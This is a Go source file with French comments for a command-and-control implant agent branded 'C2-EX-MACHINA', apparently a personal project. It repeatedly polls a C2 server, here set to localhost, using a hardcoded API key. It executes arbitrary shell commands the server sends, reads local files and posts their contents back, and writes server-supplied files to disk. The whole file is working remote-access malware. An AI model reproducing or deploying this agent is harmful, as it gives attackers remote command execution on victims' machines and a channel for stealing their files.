package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"time"
)

/*
   processCommandTask traite les tâches de type commande et retourne le stdout, le stderr et le status de la tâche.
   Elle retourne une erreur si la commande n'a pas pu être exécutée.

   Args:
   - task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data" contenant la commande à exécuter

   Returns:
   - stdout: le résultat de la commande exécutée (stdout)
   - stderr: le résultat d'erreurs générées par la commande (stderr)
   - exitCode: le code de sortie de la commande
   - err: une erreur éventuelle rencontrée lors de l'exécution de la commande
*/
func processCommandTask(task map[string]interface{}) (string, string, int, error) {
	fmt.Println("startProcess")
	cmd := exec.Command("sh", "-c", task["Data"].(string))
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return "", "", cmd.ProcessState.ExitCode(), err
	}
	return stdout.String(), stderr.String(), cmd.ProcessState.ExitCode(), nil
}

/*
   processUploadTask traite les tâches de type "upload" et retourne le contenu du fichier.

   Args:
   - task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data" contenant le chemin vers le fichier à lire

   Returns:
   - fileContent: le contenu du fichier lu
   - stderr: une chaîne vide
   - exitCode: 0 (pas d'erreur rencontrée)
   - err: une erreur éventuelle rencontrée lors de la lecture du fichier
*/

func processUploadTask(task map[string]interface{}) (string, string, int, error) {
	fmt.Println("readFile")
	fileContent, err := ioutil.ReadFile(task["Data"].(string))
	if err != nil {
		return "", "", 1, err
	}
	return string(fileContent), "", 0, nil
}

/*
   processDownloadTask traite les tâches de type "download" et écrit le contenu reçu dans un fichier.

   Args:
   - task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data" contenant le contenu à écrire dans le fichier et une clé "Filename" contenant le nom du fichier

   Returns:
   - stdout: une chaîne vide
   - stderr: une chaîne vide
   - exitCode: 0 (pas d'erreur rencontrée)
   - err: une erreur éventuelle rencontrée lors de l'écriture dans le fichier
*/

func processDownloadTask(task map[string]interface{}) (string, string, int, error) {
	fmt.Println("writeFile")
	err := ioutil.WriteFile(task["Filename"].(string), []byte(task["Data"].(string)), 0644)
	if err != nil {
		return "", "", 1, err
	}
	return "", "", 0, nil
}

/*
   cette fonction permet de traiter les taches
   elle retourne le stdout, le stderr et le status de la tache
   elle retourne une erreur si le type de tache n'est pas reconnu
*/

func processTask(task map[string]interface{}) (string, string, int, error) {
	switch task["Type"].(string) {
	case "COMMAND":
		return processCommandTask(task)
	case "UPLOAD":
		return processUploadTask(task)
	case "DOWNLOAD":
		return processDownloadTask(task)
	}
	return "", "", 1, fmt.Errorf("invalid task type")
}

/*
   cette fonction permet de lancer l'agent
   elle est appelee par la fonction main
   elle contient une boucle infinie qui permet de traiter les taches
   elle retourne une erreur si la requete n'a pas pu etre executee
   le header de la requete contient l'api-key, le user-agent et le content-type
   la requete GET permet de recuperer les taches a traiter
   la requete POST permet d'envoyer les resultats des taches traitees

*/

func runAgent() {
	fmt.Println("Defined variables")
	var (
		taskStdout string
		taskStderr string
		taskStatus int
		content    []byte
	)

	client := &http.Client{}

	headers := map[string]string{
		"Content-Type": "application/json",
		"User-Agent":   "Agent-C2-EX-MACHINA 0.0.1 (Linux) HP-PC",
		"Api-Key":      "AdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdmin",
	}

	fmt.Println("Add headers request 1")
	jsonData := []byte(`{"data":"{}"}`)
	req, err := http.NewRequest("GET", "http://127.0.0.1:8000/c2/order/01223456789abcdef", bytes.NewBuffer(jsonData))
	if err != nil {
		panic(err)
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	content, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	fmt.Println("Get content response 1")

	for {
		var order map[string]interface{}
		err = json.Unmarshal(content, &order)
		if err != nil {
			panic(err)
		}

		var body []map[string]interface{}

		fmt.Println("Parse JSON")

		for _, task := range order["Tasks"].([]interface{}) {
			fmt.Println("Process task")
			taskStdout, taskStderr, taskStatus, err = processTask(task.(map[string]interface{}))
			if err != nil {
				taskStatus = 1
				taskStderr = err.Error()
			}
			fmt.Println("body add task result")
			body = append(body, map[string]interface{}{
				"id":     task.(map[string]interface{})[" id"],
				"stdout": taskStdout,
				"stderr": taskStderr,
				"status": taskStatus,
			})
		}

		fmt.Println("Add headers request 2")
		jsonData, err = json.Marshal(map[string]interface{}{
			"tasks": body,
		})
		if err != nil {
			panic(err)
		}

		req, err = http.NewRequest("POST", "http://127.0.0.1:8000/c2/order/01223456789abcdef", bytes.NewBuffer(jsonData))
		if err != nil {
			panic(err)
		}

		for key, value := range headers {
			req.Header.Set(key, value)
		}

		resp, err = client.Do(req)
		if err != nil {
			panic(err)
		}

		defer resp.Body.Close()

		content, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			panic(err)
		}

		fmt.Println("Get content response 2")

		time.Sleep(5 * time.Second)
	}
}

/*
   cette fonction permet de lancer l'agent
   elle est appelee par la fonction main
*/

func main() {

	fmt.Println(`
	░█████╗░██████╗░░░░░░░███████╗██╗░░██╗░░░░░░███╗░░░███╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░█████╗░
	██╔══██╗╚════██╗░░░░░░██╔════╝╚██╗██╔╝░░░░░░████╗░████║██╔══██╗██╔══██╗██║░░██║██║████╗░██║██╔══██╗
	██║░░╚═╝░░███╔═╝█████╗█████╗░░░╚███╔╝░█████╗██╔████╔██║███████║██║░░╚═╝███████║██║██╔██╗██║███████║
	██║░░██╗██╔══╝░░╚════╝██╔══╝░░░██╔██╗░╚════╝██║╚██╔╝██║██╔══██║██║░░██╗██╔══██║██║██║╚████║██╔══██║
	╚█████╔╝███████╗░░░░░░███████╗██╔╝╚██╗░░░░░░██║░╚═╝░██║██║░░██║╚█████╔╝██║░░██║██║██║░╚███║██║░░██║
	░╚════╝░╚══════╝░░░░░░╚══════╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝`)
	time.Sleep(4 * time.Second)
	runAgent()
}

/*petit text funky pour faire jolie @bybl4ck4rch*/
